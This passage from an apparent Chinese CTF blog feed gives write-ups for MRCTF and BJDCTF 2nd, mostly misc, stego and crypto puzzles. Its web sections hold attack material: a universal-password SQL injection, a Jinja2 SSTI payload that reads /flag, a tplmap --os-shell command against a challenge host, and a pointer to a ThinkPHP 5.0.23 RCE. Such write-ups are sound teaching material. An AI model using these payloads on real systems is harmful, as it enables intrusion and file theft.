<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br><span class="line"><span class="keyword">echo</span> $Public_key = public_key();</span><br><span class="line"><span class="keyword">echo</span> $a = private_key();</span><br></pre></td></tr></table></figure></div>

<p>得到私钥：XuNhoueCDCGc</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>

<p>用户名无所谓，password没过滤，万能密码，私钥输进去</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/12.png" src="/img/loading.gif" class="lazyload"></a>

<p>登录得到flag</p>
<h3 id="Ezpop-Revenge"><a href="#Ezpop-Revenge" class="headerlink" title="Ezpop_Revenge"></a>Ezpop_Revenge</h3><p>一个复杂的反序列化，待补充</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Cyberpunk"><a href="#Cyberpunk" class="headerlink" title="Cyberpunk"></a>Cyberpunk</h3><p>当时还以为要逆向…..跑程序之前，改一下电脑日期就可</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/13.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="ezmisc"><a href="#ezmisc" class="headerlink" title="ezmisc"></a>ezmisc</h3><p>改一下png高度</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/30/MRCTF/14.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="你能看懂音符吗"><a href="#你能看懂音符吗" class="headerlink" title="你能看懂音符吗"></a>你能看懂音符吗</h3><p>改文件头、隐藏文字、音符解码</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/15.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="寻找xxx"><a href="#寻找xxx" class="headerlink" title="寻找xxx"></a>寻找xxx</h3><p><a href="https://www.btis.site/2020/03/09/xctf-misc-wp/#%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF">电话音</a>+微信公众号（想抢1血的没猜到公众号……</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/16.jpg" src="/img/loading.gif" class="lazyload"></a>

<h3 id="摇滚DJ"><a href="#摇滚DJ" class="headerlink" title="摇滚DJ"></a>摇滚DJ</h3><p>无线电转图片（<a href="https://apktrending.com/apk-android/xdsopl-robot36.html" target="_blank" rel="noopener">Robot36 - SSTV Image Decoder</a></p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/17.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="千层套路"><a href="#千层套路" class="headerlink" title="千层套路"></a>千层套路</h3><p>脚本开压缩包、RGB转二维码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> [ -e *.zip ]; <span class="keyword">do</span></span><br><span class="line">  files=*.zip;</span><br><span class="line">  <span class="keyword">for</span> file <span class="keyword">in</span> <span class="variable">$files</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">"Cracking <span class="variable">$&#123;file&#125;</span>… "</span>;</span><br><span class="line">    password=<span class="variable">$&#123;file%%.*&#125;</span></span><br><span class="line">    <span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$&#123;password&#125;</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"Failed to find password"</span>;</span><br><span class="line">      <span class="built_in">break</span> 2;</span><br><span class="line">    <span class="keyword">fi</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Found password: \`<span class="variable">$&#123;password&#125;</span>\`"</span>;</span><br><span class="line">    unzip -q -P <span class="string">"<span class="variable">$&#123;password&#125;</span>"</span> <span class="string">"<span class="variable">$file</span>"</span>;</span><br><span class="line">    rm <span class="string">"<span class="variable">$&#123;file&#125;</span>"</span>;</span><br><span class="line">  <span class="keyword">done</span>;</span><br><span class="line"><span class="keyword">done</span>;</span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">200</span>    <span class="comment">#x坐标  通过对txt里的行数进行整数分解</span></span><br><span class="line">y = <span class="number">200</span>    <span class="comment">#y坐标  x * y = 行数</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">"RGB"</span>, (x, y))   <span class="comment">#创建图片</span></span><br><span class="line">file = open(<span class="string">'qr.txt'</span>)    <span class="comment">#打开rgb值的文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过每个rgb点生成图片</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, y):</span><br><span class="line">        line = file.readline()  <span class="comment">#获取一行的rgb值</span></span><br><span class="line">        rgb = line.split(<span class="string">", "</span>)  <span class="comment">#分离rgb，文本中逗号后面有空格</span></span><br><span class="line">        im.putpixel((i, j), (int(rgb[<span class="number">0</span>]), int(rgb[<span class="number">1</span>]), int(rgb[<span class="number">2</span>])))    <span class="comment">#将rgb转化为像素</span></span><br><span class="line"></span><br><span class="line">im.show()   <span class="comment">#也可用im.save('flag.jpg')保存下来</span></span><br></pre></td></tr></table></figure></div>

<h3 id="不眠之夜"><a href="#不眠之夜" class="headerlink" title="不眠之夜"></a>不眠之夜</h3><p>montage+gaps（或者手拼</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">montage *jpg -tile 10x12 -geometry 200x100+0+0 out.jpg</span><br><span class="line">gaps --image=out.jpg --generations=40 --population=120 --size=100</span><br></pre></td></tr></table></figure></div>

<p>先合并后用<a href="https://blog.csdn.net/uwr44uouqcnsuqb60zk2/article/details/78516605" target="_blank" rel="noopener">gaps</a>拼图</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/18.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="pyFlag"><a href="#pyFlag" class="headerlink" title="pyFlag"></a>pyFlag</h3><p>三个照片里多余信息拼成一个新的zip、爆破zip密码 1234、base85 16 32 16 64</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/21.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="Unravel"><a href="#Unravel" class="headerlink" title="Unravel"></a>Unravel</h3><p>foremost、aes、silenteye</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/19.png" src="/img/loading.gif" class="lazyload"></a>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/20.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="Hello-misc"><a href="#Hello-misc" class="headerlink" title="Hello_misc"></a>Hello_misc</h3><p>foremost、red_plane0分离、ttl、二进制转ascii、zip转doc、隐藏文字、base64、查找显色</p>
<p>预期跑red_plane的脚本（转自<a href="http://www.ga1axy.top/index.php/archives/13/#hellomiscworld！" target="_blank" rel="noopener">ga1xy</a>师傅）</p>
<p>出题：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> bitstring</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.png'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bitcon = bitstring.Bits(f)</span><br><span class="line">    im = Image.new(<span class="string">'RGB'</span>,(<span class="number">1024</span>,<span class="number">780</span>),(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    pim = im.load()</span><br><span class="line">    <span class="keyword">for</span> i,val <span class="keyword">in</span> enumerate(bitcon.bin):</span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">'0'</span>:</span><br><span class="line">            pim[i%<span class="number">1024</span>,i/<span class="number">1024</span>] = (<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>)</span><br><span class="line">    im.save(<span class="string">'red_blue.png'</span>)</span><br></pre></td></tr></table></figure></div>

<p>解题：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> bitstring</span><br><span class="line"></span><br><span class="line">im = Image.open(<span class="string">'try to restore it.png'</span>)</span><br><span class="line">width = im.size[<span class="number">0</span>]</span><br><span class="line">height = im.size[<span class="number">1</span>]</span><br><span class="line">pim = im.load() <span class="comment"># 读取图片的像素信息</span></span><br><span class="line">bin_result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> range(height):</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> range(width):</span><br><span class="line">        <span class="keyword">if</span> pim[w,h][<span class="number">0</span>] == <span class="number">255</span>: <span class="comment"># 判断是否是红色（R,G,B）[0]表示第一通道</span></span><br><span class="line">            bin_result += <span class="string">'1'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bin_result += <span class="string">'0'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print bitstring.BitArray(bin=bin_result).bytes.encode('hex')</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'result.png'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(bitstring.BitArray(bin=bin_result).bytes)</span><br></pre></td></tr></table></figure></div>

<p>非预期：直接查看red_plane0通道，Save Bin</p>
<p>ttl解密脚本</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fp = open(<span class="string">'out.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">a = fp.readlines()</span><br><span class="line">p = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    p.append(int(i[<span class="number">0</span>:]))</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">63</span>:</span><br><span class="line">        a = <span class="string">'00'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">127</span>:</span><br><span class="line">        a = <span class="string">'01'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">191</span>:</span><br><span class="line">        a = <span class="string">'10'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">255</span>:</span><br><span class="line">        a = <span class="string">'11'</span></span><br><span class="line">    s += a</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">8</span>):</span><br><span class="line"> result += chr(int(s[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (result)</span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/22.png" src="/img/loading.gif" class="lazyload"></a>

<p>解开后看zip组成，知道是个doc或者docx，改后缀，将下面的白色字体变色，base64解码后得到0 1字符串</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/23.png" src="/img/loading.gif" class="lazyload"></a>

<p>搜索0，观察一下，得到flag</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF-2nd-wp</title>
    <url>/2020/03/21/BJDCTF-2nd-wp/</url>
    <content><![CDATA[<p>上周六，第二届BJD在buuoj上举行了，去水了一下，在这里写一些misc和crypto的wp吧（别问，问就是web基本不会</p>
<p>&nbsp;</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="最简单的misc-y1ng"><a href="#最简单的misc-y1ng" class="headerlink" title="最简单的misc-y1ng"></a>最简单的misc-y1ng</h3><p>思路：伪加密+补全文件头+16进制转ASCII</p>
<p>09-&gt;00，补全文件头89 50 4E 47，得到下图</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>将下面那一行转换为ASCII后得到flag：<code>BJD{y1ngzuishuai}</code></p>
<h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p>思路：png高度修改</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/21/BJDCTF-2nd-wp/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>开始没想修改高度，直接放到slover了啥也没发现，然后用zsteg没法发现隐写，最后去改了高度</p>
<p>得到flag：<code>BJD{PnG_He1ghT_1s_WR0ng}</code></p>
<h3 id="EasyBaBa"><a href="#EasyBaBa" class="headerlink" title="EasyBaBa"></a>EasyBaBa</h3><p>思路：foremost分离+改文件格式+视频逐帧+二维码反色+16进制转ASCII</p>
<p>foremost分离出了一个zip，解压得到一个jpg，格式不正确，file一下发现是avi，改后缀</p>
<p>近期钉钉“求饶”视频，但是里面混进去一些图片，pr，ae，ff不会用。。（所以我选择迅雷</p>
<p>逐帧查看后发现四张图片(都是出题人…</p>
<p><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/3.png" src="/img/loading.gif" class="lazyload"></a><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/4.png" src="/img/loading.gif" class="lazyload"></a></p>
<p><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/5.png" src="/img/loading.gif" class="lazyload"></a><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/6.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>前三张反色完，要不PsQREdit，要不Barcode Reader都能扫出来</p>
<p>但是第4张中间有、糊，于是掏出QRazyBox自己拼了一张</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/7.png" src="/img/loading.gif" class="lazyload"></a>

<p>最后把扫出来的字符串拼起来得到<code>6167696E5F6C  6F76655F59  424A447B696D  316E677D</code></p>
<p>16进制转ASCII后调整一下顺序得到flag：<code>BJD{imagin_love_Y1ng}</code></p>
<h3 id="小姐姐-y1ng"><a href="#小姐姐-y1ng" class="headerlink" title="小姐姐-y1ng"></a>小姐姐-y1ng</h3><p>思路：直接010里搜BJD</p>
<p>u1s1，图不错，这题卡了半天</p>
<p>刚开始拿stegdetect分析了一下，以为是jphide。。然后因为不知道密码是啥就一直卡住了，break爆破也爆不出来</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/8.png" src="/img/loading.gif" class="lazyload"></a>

<p>最后去010里面搜了一下BJD。。（人傻了</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/9.png" src="/img/loading.gif" class="lazyload"></a>

<p>得到flag：<code>BJD{haokanma_xjj}</code></p>
<h3 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real_EasyBaBa"></a>Real_EasyBaBa</h3><p>思路：010里面看flag形状（抽象带师。。</p>
<p>打开010，往下拉</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/21/BJDCTF-2nd-wp/10.png" src="/img/loading.gif" class="lazyload"></a>

<p>得到flag：<code>BJD{572154976}</code></p>
<h3 id="圣火昭昭-y1ng"><a href="#圣火昭昭-y1ng" class="headerlink" title="圣火昭昭-y1ng"></a>圣火昭昭-y1ng</h3><p>思路：新佛曰+outguess隐写</p>
<p>看属性发现新佛曰，<a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">解码</a>一下（得到key：gemlove，题目提示去掉com</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/11.png" src="/img/loading.gif" class="lazyload"></a>

<p>然后根据题目hint：<code>开局一张图，flag全靠猜</code>     暗示outguess隐写</p>
<p>其实刚开始我没理解这意思，然后用stegdetect扫<code>error: Quantization table 0x00 was not defined</code></p>
<p>打开010看一下，发现大量00，20明示outguess隐写</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/12.png" src="/img/loading.gif" class="lazyload"></a>

<p>解出来得到flag：<code>BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}</code></p>
<h3 id="TARGZ-y1ng"><a href="#TARGZ-y1ng" class="headerlink" title="TARGZ-y1ng"></a>TARGZ-y1ng</h3><p>思路：文件名为压缩包密码，多层压缩包解密</p>
<p>这题是给新生的？？记得前一阵子跟楠子哥去水Sarctf的时候就遇到过这b题，当时拆自闭了，后来也没管</p>
<p>看一了眼出题人，去<a href="https://www.gem-love.com/ctf/1471.html" target="_blank" rel="noopener">师傅博客</a>瞅了瞅，果然打Sarctf了。。当时的是无后缀zip</p>
<p>这波是有后缀.tar.gz，发现脚本，想改改，发现自己不会改。。</p>
<p>贴一下群里Orge师傅的bash脚本</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> [ -e *.tar.gz ]; <span class="keyword">do</span></span><br><span class="line">  files=*.tar.gz;</span><br><span class="line">  <span class="keyword">for</span> file <span class="keyword">in</span> <span class="variable">$files</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">"Cracking <span class="variable">$&#123;file&#125;</span>… "</span>;</span><br><span class="line">    password=<span class="variable">$&#123;file%%.*&#125;</span></span><br><span class="line">    <span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$&#123;password&#125;</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"Failed to find password"</span>;</span><br><span class="line">      <span class="built_in">break</span> 2;</span><br><span class="line">    <span class="keyword">fi</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Found password: \`<span class="variable">$&#123;password&#125;</span>\`"</span>;</span><br><span class="line">    unzip -q -P <span class="string">"<span class="variable">$&#123;password&#125;</span>"</span> <span class="string">"<span class="variable">$file</span>"</span>;</span><br><span class="line">    rm <span class="string">"<span class="variable">$&#123;file&#125;</span>"</span>;</span><br><span class="line">  <span class="keyword">done</span>;</span><br><span class="line"><span class="keyword">done</span>;</span><br></pre></td></tr></table></figure></div>

<p>py脚本有时间补一哈</p>
<p>最后得到flag：<code>BJD{wow_you_can_rea11y_dance}</code></p>
<h3 id="Imagin-开场曲"><a href="#Imagin-开场曲" class="headerlink" title="Imagin - 开场曲"></a>Imagin - 开场曲</h3><p>思路：玩mikutap，根据键盘键位打出相似的拍子，然后移位得到密码</p>
<p>hint：</p>
<blockquote>
<p>大写<br>mikutap<br>开场曲重复了两遍<br>flag交一遍的就行<br>格式BJD{字母+数字}<br>数字范围0-5</p>
</blockquote>
<p>（横，圈点，实心方块）x 2+ （叉，空心方块，实心散布圆，空心散布圆，实心方块，空心多边形，实心多边形）x 2+  （中心出发圆，中心出发圆，空心多边形，中心出发圆）x 2 </p>
<p>听就完事了…..最后得到flag：<code>BJD{MIKUTAP3313313}</code></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>做的全是1分的嗷，菜鸡不愿去找RSA脚本了</p>
<h3 id="签到-y1ng"><a href="#签到-y1ng" class="headerlink" title="签到-y1ng"></a>签到-y1ng</h3><p>QkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ==</p>
<p>base64解码得到flag：<code>BJD{W3lc0me_T0_BJDCTF}</code></p>
<h3 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h3><p>这题给爷整笑了，百度翻译读一下</p>
<p>去掉BJD{}对应的字，得到flag：<code>BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}</code></p>
<h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/13.gif" src="/img/loading.gif" class="lazyload"></a>

<p>拿🍙的是0，拿🍗的是1，翻译一下，二进制转ASCII</p>
<p>得到flag：<code>BJD{M!a0~}</code></p>
<h3 id="灵能精通-y1ng"><a href="#灵能精通-y1ng" class="headerlink" title="灵能精通-y1ng"></a>灵能精通-y1ng</h3><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/21/BJDCTF-2nd-wp/14.png" src="/img/loading.gif" class="lazyload"></a>

<p>圣堂武士密码，翻译一哈，flag：<code>BJD{IMKNIGHTSTEMPLAR}</code></p>
<h3 id="燕言燕语"><a href="#燕言燕语" class="headerlink" title="燕言燕语"></a>燕言燕语</h3><p>16进制转ASCII+维吉尼亚密码</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/16.png" src="/img/loading.gif" class="lazyload"></a>

<p>得到flag：<code>bjd{yanzi_jiushige_shabi}</code></p>
<h3 id="Y1nglish-y1ng"><a href="#Y1nglish-y1ng" class="headerlink" title="Y1nglish-y1ng"></a>Y1nglish-y1ng</h3><p>本来以为这题是词频分析，然后直接上脚本，还把字母顺序和最常出现字母顺序对应了一下，然并卵</p>
<p>最后收到群里师傅的启发用<a href="https://www.quipqiup.com" target="_blank" rel="noopener">quipquip</a>（解一些简单替换密码，其中MIH明显对应BJD</p>
<p>hint中提示都是英文单词，所以把y替换成k</p>
<p>最后得到flag：<code>BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}</code></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><p>SSTI模板注入 （jinjia2</p>
<p>随意输一个数字在网页源代码出看到提示ssssssti，然而并不会…..</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/17.png" src="/img/loading.gif" class="lazyload"></a>

<p>根据<a href="https://www.1p0ch.cn" target="_blank" rel="noopener">王牌辅助楠子神</a>给的提示，搜SSTI模板注入，大概看懂了点，讲也讲不出来，直接放payload</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">markdown</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">qaq?name=&#123;&#123;().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">177</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>.<span class="strong">__builtins__</span>[<span class="string">'open'</span>](<span class="link">'/flag'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>还有参考的<a href="https://www.cnblogs.com/20175211lyz/p/11425368.html" target="_blank" rel="noopener">师傅的博客</a></p>
<p>好像还有一种<a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">tplmap</a>的解法</p>
<blockquote>
<p>Tplmap是一个python工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用SSTI来访问目标文件或操作系统。一些受支持的模板引擎包括PHP（代码评估），Ruby（代码评估），JaveScript（代码评估），Python（代码评估），ERB，Jinja2和Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。</p>
</blockquote>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./tplmap.py -u http://9df44046-64a1-4ab3-b167-6e2bca4fe272.node3.buuoj.cn/qaq?name= --os-shell</span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/22.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h3><p>网站提示：Power By thinkphp5</p>
<p>随便输入一个s参数，报错如下</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/20.png" src="/img/loading.gif" class="lazyload"></a>

<p>得到tp版本，网上搜一下<a href="https://blog.csdn.net/qq_38807738/article/details/86777541" target="_blank" rel="noopener">5.0.23</a>的漏洞，可以直接用的，得到flag</p>
